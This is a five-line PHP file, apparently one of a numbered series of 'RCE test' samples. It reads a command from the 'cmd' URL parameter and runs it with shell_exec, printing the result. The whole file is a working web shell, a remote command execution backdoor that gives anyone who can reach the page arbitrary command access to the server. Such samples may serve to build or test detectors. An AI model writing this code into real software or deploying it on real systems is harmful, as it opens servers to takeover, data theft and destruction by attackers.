<?php
// RCE test variation #417
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>